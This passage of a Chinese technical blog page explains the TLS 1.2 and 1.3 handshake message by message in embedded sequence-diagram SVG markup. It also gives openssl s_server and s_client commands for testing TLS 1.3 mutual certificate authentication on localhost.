&#35777;&#20070;&#31614;&#21517;&#20540;&#65288;&#27599;&#20010;&#35777;&#20070;&#37117;&#33258;&#24102;&#65288;&#31614;&#21457;&#26102;&#20351;&#29992;&#31169;&#38053;&#21152;&#23494;&#25688;&#35201;&#20449;&#24687;&#31639;&#20986;&#26469;&#30340;&#65289;&#65292;&#29992;&#20110;&#38450;&#31713;&#25913;&#65292;&#19981;&#26159;tls&#36807;&#31243;&#20013;&#31639;&#20986;&#26469;&#30340;&#65289;</text><path d="M32,1191.4297 L32,1261.4297 L771,1261.4297 L771,1201.4297 L761,1191.4297 L32,1191.4297 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M761,1191.4297 L761,1201.4297 L771,1201.4297 L761,1191.4297 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="129" x="38" y="1208.4966">Client Key Exchange</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="38" y="1223.6294">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="269" x="38" y="1238.7622">Handshake Type: Client Key Exchange(16)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="702" x="54" y="1253.895">&#29983;&#25104;&#39044;&#20027;&#23494;&#38053;&#65292;&#20351;&#29992;&#26381;&#21153;&#31471;&#19979;&#21457;&#30340;&#20844;&#38053;&#21152;&#23494;&#19978;&#20256;&#21040;&#26381;&#21153;&#31471;&#65292;&#30001;&#20110;&#21482;&#26377;&#26381;&#21153;&#31471;&#33258;&#24049;&#26377;&#31169;&#38053;&#36825;&#19968;&#27493;&#20445;&#35777;&#35777;&#20070;&#26159;&#26381;&#21153;&#31471;&#33258;&#24049;&#25345;&#26377;&#30340;</text><path d="M110,1271.9609 L110,1341.9609 L693,1341.9609 L693,1281.9609 L683,1271.9609 L110,1271.9609 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M683,1271.9609 L683,1281.9609 L693,1281.9609 L683,1271.9609 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="105" x="116" y="1289.0278">Certificate Verify</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="116" y="1304.1606">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="249" x="116" y="1319.2935">Handshake Type: Certificate Verify (15)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="546" x="132" y="1334.4263">&#20351;&#29992;&#23458;&#25143;&#31471;&#35777;&#20070;&#30340;&#31169;&#38053;&#23545;&#25569;&#25163;&#20449;&#24687;&#36827;&#34892;&#31614;&#21517;&#65292;&#30001;&#26381;&#21153;&#31471;&#36827;&#34892;&#39564;&#31614;&#26469;&#30830;&#23450;&#35777;&#20070;&#26159;&#23458;&#25143;&#31471;&#33258;&#24049;&#25345;&#26377;&#30340;</text><path d="M262,1352.4922 L262,1407.4922 L540,1407.4922 L540,1362.4922 L530,1352.4922 L262,1352.4922 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M530,1352.4922 L530,1362.4922 L540,1362.4922 L530,1352.4922 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="138" x="268" y="1369.5591">Change Chipher Spec</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="257" x="268" y="1384.6919">Content Type: Change Chipher Spec(20)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="195" x="284" y="1399.8247">&#21578;&#30693;&#26381;&#21153;&#31471;&#65292;&#19979;&#38754;&#30340;&#25968;&#25454;&#35201;&#21152;&#23494;&#20102;</text><path d="M279,1417.8906 L279,1502.8906 L523,1502.8906 L523,1427.8906 L513,1417.8906 L279,1417.8906 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M513,1417.8906 L513,1427.8906 L523,1427.8906 L513,1417.8906 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="52" x="285" y="1434.9575">Finished</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="223" x="285" y="1450.0903">Opaque Type: Application Data(23)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="117" x="301" y="1465.2231">&#19979;&#38754;&#26159;&#35299;&#23494;&#21518;&#30340;&#25968;&#25454;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="301" y="1480.356">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="192" x="301" y="1495.4888">Handshake Type: Finished(20)</text><polygon fill="#181818" points="412.5,1525.6875,402.5,1529.6875,412.5,1533.6875,408.5,1529.6875" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="406.5" x2="1086.5" y1="1529.6875" y2="1529.6875"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="320" x="418.5" y="1524.6216">New Session Ticket, Change Cipher Spec, Finished</text><path d="M948,1542.6875 L948,1612.6875 L1227,1612.6875 L1227,1552.6875 L1217,1542.6875 L948,1542.6875 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1217,1542.6875 L1217,1552.6875 L1227,1552.6875 L1217,1542.6875 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="122" x="954" y="1559.7544">New Session Ticket</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="257" x="954" y="1574.8872">Content Type: Change Chipher Spec(20)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="258" x="954" y="1590.02">Handshake Type: New Session Ticket (4)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="221" x="970" y="1605.1528">&#32473;&#19968;&#20010;session&#21040;&#23458;&#25143;&#31471;&#65292;&#29992;&#20110;ssl&#22797;&#29992;</text><path d="M948,1623.2188 L948,1678.2188 L1226,1678.2188 L1226,1633.2188 L1216,1623.2188 L948,1623.2188 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1216,1623.2188 L1216,1633.2188 L1226,1633.2188 L1216,1623.2188 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="138" x="954" y="1640.2856">Change Chipher Spec</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="257" x="954" y="1655.4185">Content Type: Change Chipher Spec(20)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="195" x="970" y="1670.5513">&#21578;&#30693;&#23458;&#25143;&#31471;&#65292;&#19979;&#38754;&#30340;&#25968;&#25454;&#35201;&#21152;&#23494;&#20102;</text><path d="M965,1688.6172 L965,1773.6172 L1209,1773.6172 L1209,1698.6172 L1199,1688.6172 L965,1688.6172 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1199,1688.6172 L1199,1698.6172 L1209,1698.6172 L1199,1688.6172 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="52" x="971" y="1705.6841">Finished</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="223" x="971" y="1720.8169">Opaque Type: Application Data(23)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="117" x="987" y="1735.9497">&#19979;&#38754;&#26159;&#35299;&#23494;&#21518;&#30340;&#25968;&#25454;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="987" y="1751.0825">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="192" x="987" y="1766.2153">Handshake Type: Finished(20)</text><rect fill="#EEEEEE" height="3" style="stroke:#EEEEEE;stroke-width:1.0;" width="1352" x="0" y="1799.8477"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1352" y1="1799.8477" y2="1799.8477"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1352" y1="1802.8477" y2="1802.8477"/><rect fill="#EEEEEE" height="23.1328" style="stroke:#000000;stroke-width:2.0;" width="117" x="617.5" y="1789.2813"/><text fill="#000000" font-family="sans-serif" font-size="13" font-weight="bold" lengthAdjust="spacing" textLength="98" x="623.5" y="1805.3481">&#24320;&#22987;ssl&#25968;&#25454;&#20256;&#36755;</text><!--SRC=[rLVVKnDN57xVl-8-9ZFgv0SwBJCuambKd5Rj65eVCsjo9LlZ9iqk5juI2nWWCK5Xal9330LnGB9GEngI87zCz-vkdlWNUlRUpMQJ25NhGyiBxBtdt7lETxxpdOiio76CvBZalUJJLwPJ4cye6VNe9IdaI77Hg6x19ySb-PGiH8GaByee4XUmA7SjIJZr4ASuRcW8oP4aQTJrlGLIpMdP8Ya-GKD37CUSBbvbbeCeIB_HA8x74voOa35Am7hxRFOBnUXkC27AvjVOL18Feb5UZ4en_Zvs-NnkxaUSaeI4E8Z6lWiXxoKFSdacFNwFruqGCav-KskxfA2eZMroSgmlRvysSxPxgr66vCZ1eLPMQFOUpjwphdB6wFAwEJWJzLpeioxqmuMakgbbt-bxYhQaQBaCWAcjfLjxPJXTdyjgQw_f0NgrfBrP9jibjV5MFQbe6GK5XMGCSWzD23AMg97vGt8pfBX7bDdMqssrlgNbDvdhN-cCKTzJ6yUiDlOYKOxqdGCo_m9Sx4LsWxPODbvQblJyraf1MwjhomVeDkISUD2vT2vFLbTDsFPBnlmZjLQ_TcCC_I0AarhfRQlq9o18Df-JPjqw8Rr3NGtbdNRuY6QS9_CLKioZaKae6eEArJmiyW-moyDWrFVVWn5vbYMrd8L8jcHKNdMv2UCYBq-aS9YFZoTIWXnx8BcyVZU7nIWoASDnxEIBLnbV1b68VhEANK1130oz9qHu6NTzeDluvmaioHUwxD5mGiGEAbgSTfgSIyLUzZWTNRv_P8zUgPBg2gmphW3oi4-TM8awDVktnNBIZKOIlXqAXEzS7niD1qP2OT_bA-5hmHlXq6Z0_zK0ZT3pTTHj1UYaBzUfH1zi3hW_2JM7dyjhzPnQMo25HKOjQ2-cJprzmXOPtSqEOHesyngQv_yHfVt9MeFPV5peRJv_RWfjVqIxY_RpompqSqVG2aLG81OUa4gjfOtiQz1DSLmG9ripUVsugjRsIJDDYefQdpMLg0s0zgBIsiqntZbkb2462Rdyx0yt8ZCPerfZzu2CM4WSDiZp1Hj2O2aAWIRO2yEXKFV2I73OQHDg2mX08SLGm5OHvFBvKKTKtCXMR4kNdkPYuE4Gp651aWLnV4AGOZYAReAIIIPQbz7TATcCFnZGLsjavWqhczbuXLrsgBQ_5GmmRfZdKokB6sSNjr-NFbTvgBVBE-2sj9BDLBtnJ5lVS0XfttZkaaus1x_5Ko3FaHWlZlVeASYQS6yArkYUBJ197Bc0HiH8QYef0sgTC6zWIUB7SV_S_vBzoCXaSzZHZmvhamgU0N-xZCx-RAtEsiHoU0mYaby6pNMQsdRcZpcsSDG9ZyNcbMcoKJUblT-7-atS_Gb7PD2HHckpVDRsznDtuq84Id5Tl9T0J3hEEF0X7nUYWZnbtQ-jpMdBC5eskWpjBhWU1R0XOYY62w25AN07bg7dh0B2s79tUU9sOGUHKxX8kddQp6fAmSQezUknyNYNr40wigODY6JfhNfyeY-zqdSo43zxix172ii5Eeyyhclhsm3QQNCE-WcCrVgJLlaFNQbeIqTKXVBiwMQSFDPVBO00zNXzgB_QFEjdzAVnhT_VvRrYFMsMDk3TszgSXaAorviPB4tN7Wws7h02CW3KshpQV46o1xOPpViGyZRL1CfdpnQ0yzqXh33yw4CthUq34TO1SglSPQNN7iG8N5QcpmEchwi_UwWmTr39ozPyf13qzACfYOm3of5Mg6Xp2um0nicgKSanHZ4KEidGBHWgi6lMcZvBx9mxvtzypfPgnJgorPFq1on0DbXQP75UtzXsbWoAsrhVD1_3omTQlWgajkfRdpqdYcy4aGuNxbQIXsbitHn89kCcdD1zQ9YNUHXSzci3Be64ZPtVuMpuDyk-a6dSELKpztihrxwUvdNs0_ic_WN6YsG-Oj6O4BcFvG-hlfrDtsZhF-4ZmUwDkFyWv1gmMh1XDWG8aCJseQTiNjXQ8abnifM7lyzxP7q1QZXl_aHgM57yDwa1_-kRBxwT1G2IdGxgPRn_Plwx_pS0]--></g></svg>

<h3 id="6-1-tls1-3的rsa证书双向认证"><a href="#6-1-tls1-3的rsa证书双向认证" class="headerlink" title="6.1. tls1.3的rsa证书双向认证"></a>6.1. tls1.3的rsa证书双向认证</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">服务端命令</span></span><br><span class="line">openssl s_server -accept 7777 -state -debug -key domain.key -cert domain.crt -CAfile cacert.pem -Verify 1</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">客户端命令</span></span><br><span class="line">openssl s_client -connect 127.0.0.1:7777 -cipher RSA -tls1_3 -debug -keylogfile test.log -cert domain.crt -key domain.key</span><br></pre></td></tr></table></figure>

<p><img src="/2023-07-12-01.png"></p>
<?xml version="1.0" encoding="us-ascii" standalone="no"?><svg  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" contentStyleType="text/css" height="1791px" preserveAspectRatio="none" style="width:1492px;height:1791px;background:#FFFFFF;" version="1.1" viewBox="0 0 1492 1791" width="1492px" zoomAndPan="magnify" class="kroki">$2<defs/><g><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5.0,5.0;" x1="362" x2="362" y1="36.2969" y2="1756.25"/><line style="stroke:#181818;stroke-width:0.5;stroke-dasharray:5.0,5.0;" x1="1122" x2="1122" y1="36.2969" y2="1756.25"/><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="51" x="337" y="5"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="37" x="344" y="24.9951">client</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="51" x="337" y="1755.25"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="37" x="344" y="1775.2451">client</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="57" x="1094" y="5"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="43" x="1101" y="24.9951">server</text><rect fill="#E2E2F0" height="30.2969" rx="2.5" ry="2.5" style="stroke:#181818;stroke-width:0.5;" width="57" x="1094" y="1755.25"/><text fill="#000000" font-family="sans-serif" font-size="14" lengthAdjust="spacing" textLength="43" x="1101" y="1775.2451">server</text><rect fill="#EEEEEE" height="3" style="stroke:#EEEEEE;stroke-width:1.0;" width="1485" x="0" y="66.8633"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1485" y1="66.8633" y2="66.8633"/><line style="stroke:#000000;stroke-width:1.0;" x1="0" x2="1485" y1="69.8633" y2="69.8633"/><rect fill="#EEEEEE" height="23.1328" style="stroke:#000000;stroke-width:2.0;" width="91" x="697" y="56.2969"/><text fill="#000000" font-family="sans-serif" font-size="13" font-weight="bold" lengthAdjust="spacing" textLength="72" x="703" y="72.3638">ssl&#25569;&#25163;&#38454;&#27573;</text><polygon fill="#181818" points="1110.5,106.5625,1120.5,110.5625,1110.5,114.5625,1114.5,110.5625" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="362.5" x2="1116.5" y1="110.5625" y2="110.5625"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="72" x="369.5" y="105.4966">Client Hello</text><path d="M121,123.5625 L121,344.5625 L604,344.5625 L604,133.5625 L594,123.5625 L121,123.5625 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M594,123.5625 L594,133.5625 L604,133.5625 L594,123.5625 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="68" x="127" y="140.6294">client hello</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="127" y="155.7622">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="204" x="127" y="170.895">Handshake Type: Client Hello(1)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="454" x="135" y="186.0278">Version TLS 1.2 (0x0303) &#34429;&#28982;&#26159;tls1.2&#23454;&#38469;&#35201;&#30475;&#21518;&#38754;&#30340;supported_versions</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="167" x="135" y="201.1606">&#31639;&#27861;&#22871;&#20214;&#20449;&#24687; Cipher Suites</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="377" x="151" y="216.2935">&#21253;&#21547;&#23494;&#38053;&#20132;&#25442;&#31639;&#27861;&#12289;&#36523;&#20221;&#35748;&#35777;&#31639;&#27861;&#12289;&#23545;&#31216;&#21152;&#23494;&#31639;&#27861;&#12289;&#20449;&#24687;&#25688;&#35201;&#31639;&#27861;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="96" x="135" y="231.4263">&#38543;&#26426;&#25968; Random</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="242" x="151" y="246.5591">&#21069;&#22235;&#20010;&#23383;&#33410;&#20026;GMT Unix&#26102;&#38388;&#65292;&#22686;&#24378;&#38543;&#26426;&#24615;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="312" x="135" y="261.6919">tls&#25903;&#25345;&#30340;&#29256;&#26412; Extensions: supported_versions(43)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="254" x="135" y="276.8247">&#35831;&#27714;&#30340;&#26381;&#21153;&#21517; Extension: server_name(0)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="339" x="135" y="291.9575">&#31614;&#21517;&#21704;&#24076;&#31639;&#27861;&#21015;&#34920; Extension: signature_algorithms(13)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="217" x="135" y="307.0903">&#23494;&#38053;&#20132;&#25442; Extension: key_share(51)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="91" x="151" y="322.2231">&#21457;&#36865;&#23458;&#25143;&#31471;&#20844;&#38053;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="349" x="135" y="337.356">&#23494;&#38053;&#20132;&#25442;&#27169;&#24335; Extension: psk_key_exchange_modes(45)</text><polygon fill="#181818" points="373.5,367.5547,363.5,371.5547,373.5,375.5547,369.5,371.5547" style="stroke:#181818;stroke-width:1.0;"/><line style="stroke:#181818;stroke-width:1.0;" x1="367.5" x2="1121.5" y1="371.5547" y2="371.5547"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="736" x="379.5" y="366.4888">Server Hello, Change Cipher Spec, Encrypted Extensions, Certificate Request, Certificate, Certificate Verify, Finished</text><path d="M874,384.5547 L874,575.5547 L1370,575.5547 L1370,394.5547 L1360,384.5547 L874,384.5547 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1360,384.5547 L1360,394.5547 L1370,394.5547 L1360,384.5547 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="78" x="880" y="401.6216">Server Hello</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="880" y="416.7544">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="210" x="880" y="431.8872">Handshake Type: Server Hello(2)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="96" x="896" y="447.02">&#38543;&#26426;&#25968; Random</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="242" x="912" y="462.1528">&#21069;&#22235;&#20010;&#23383;&#33410;&#20026;GMT Unix&#26102;&#38388;&#65292;&#22686;&#24378;&#38543;&#26426;&#24615;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="108" x="896" y="477.2856">&#20250;&#35805;id Session ID</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="273" x="912" y="492.4185">&#29992;&#20110;&#22797;&#29992;&#20250;&#35805;&#65292;&#23458;&#25143;&#31471;&#24102;&#20102;&#23601;&#22797;&#29992;&#65292;&#21542;&#21017;&#23601;&#26032;&#24314;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="160" x="896" y="507.5513">&#30830;&#23450;&#31639;&#27861;&#22871;&#20214; Cipher Suite</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="217" x="896" y="522.6841">&#23494;&#38053;&#20132;&#25442; Extension: key_share(51)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="91" x="912" y="537.8169">&#21457;&#36865;&#26381;&#21153;&#31471;&#20844;&#38053;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="299" x="896" y="552.9497">tls&#25903;&#25345;&#29256;&#26412; Extensions: supported_versions(43)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="443" x="912" y="568.0825">&#22238;&#22797;&#23458;&#25143;&#31471;&#27492;&#23383;&#27573;&#65292;&#20195;&#34920;&#25903;&#25345;tls1.3&#29256;&#26412;&#24182;&#36873;&#25321;tls1.3&#65292;tls1.2&#19981;&#20250;&#22238;&#22797;&#27492;&#25299;&#23637;</text><path d="M987,586.1484 L987,641.1484 L1257,641.1484 L1257,596.1484 L1247,586.1484 L987,586.1484 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1247,586.1484 L1247,596.1484 L1257,596.1484 L1247,586.1484 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="130" x="993" y="603.2153">Change Cipher Spec</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="249" x="993" y="618.3481">Content Type: Change Cipher Spec(20)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="195" x="993" y="633.481">&#21578;&#30693;&#23458;&#25143;&#31471;&#65292;&#19979;&#38754;&#30340;&#25968;&#25454;&#35201;&#21152;&#23494;&#20102;</text><path d="M940,651.5469 L940,751.5469 L1304,751.5469 L1304,661.5469 L1294,651.5469 L940,651.5469 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1294,651.5469 L1294,661.5469 L1304,661.5469 L1294,651.5469 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="137" x="946" y="668.6138">Encrypted Extensions</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="223" x="946" y="683.7466">Opaque Type: Application Data(23)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="117" x="946" y="698.8794">&#19979;&#38754;&#26159;&#35299;&#23494;&#21518;&#30340;&#25968;&#25454;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="946" y="714.0122">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="262" x="946" y="729.145">Handshake Type: Encrypted Extension(8)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="343" x="946" y="744.2778">&#19968;&#33324;&#32473;&#30340;&#26159;&#19979;&#19968;&#23618;&#30340;&#21327;&#35758;&#31867;&#22411;&#65292;&#22914;ALPH Protocol: http/1.1</text><path d="M873,762.3438 L873,877.3438 L1371,877.3438 L1371,772.3438 L1361,762.3438 L873,762.3438 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1361,762.3438 L1361,772.3438 L1371,772.3438 L1361,762.3438 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="121" x="879" y="779.4106">Certificate Request</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="223" x="879" y="794.5435">Opaque Type: Application Data(23)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="117" x="879" y="809.6763">&#19979;&#38754;&#26159;&#35299;&#23494;&#21518;&#30340;&#25968;&#25454;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="265" x="879" y="824.8091">Handshake Type: Certificate Request (13)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="359" x="895" y="839.9419">&#35201;&#27714;&#23458;&#25143;&#31471;&#25552;&#20132;&#35777;&#20070;&#65292;&#19968;&#33324;&#26159;nginx&#37197;&#32622;&#20013;&#24320;&#21551;&#20102;&#23545;&#31471;&#35777;&#20070;&#26657;&#39564;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="413" x="895" y="855.0747">Signature Hash Algorithms (23 algorithms) &#25903;&#25345;&#30340;&#31614;&#21517;&#21644;hash&#31639;&#27861;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="461" x="895" y="870.2075">Distinguished Names (135 bytes) CA&#30456;&#20851;&#20449;&#24687;&#65292;&#21482;&#25903;&#25345;&#27492;CA&#19979;&#21457;&#30340;&#30456;&#20851;&#35777;&#20070;</text><path d="M1000,888.2734 L1000,1019.2734 L1244,1019.2734 L1244,898.2734 L1234,888.2734 L1000,888.2734 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1234,888.2734 L1234,898.2734 L1244,898.2734 L1234,888.2734 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="65" x="1006" y="905.3403">Certificate</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="223" x="1006" y="920.4731">Opaque Type: Application Data(23)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="117" x="1006" y="935.606">&#19979;&#38754;&#26159;&#35299;&#23494;&#21518;&#30340;&#25968;&#25454;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="65" x="1006" y="950.7388">Certificate</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="1006" y="965.8716">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="205" x="1006" y="981.0044">Handshake Type: Certificate(11)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="91" x="1006" y="996.1372">&#19979;&#21457;&#26381;&#21153;&#31471;&#35777;&#20070;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="156" x="1006" y="1011.27">&#21253;&#21547;&#20027;&#39064;&#12289;&#20844;&#38053;&#12289;&#31614;&#21517;&#31639;&#27861;</text><path d="M764,1029.3359 L764,1129.3359 L1480,1129.3359 L1480,1039.3359 L1470,1029.3359 L764,1029.3359 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><path d="M1470,1029.3359 L1470,1039.3359 L1480,1039.3359 L1470,1029.3359 " fill="#FEFFDD" style="stroke:#181818;stroke-width:0.5;"/><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="105" x="770" y="1046.4028">Certificate Verify</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="223" x="770" y="1061.5356">Opaque Type: Application Data(23)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="117" x="786" y="1076.6685">&#19979;&#38754;&#26159;&#35299;&#23494;&#21518;&#30340;&#25968;&#25454;</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="191" x="770" y="1091.8013">Content Type: Handshake(22)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="245" x="786" y="1106.9341">Handshake Type: Certificate Verify(15)</text><text fill="#000000" font-family="sans-serif" font-size="13" lengthAdjust="spacing" textLength="663" x="802" 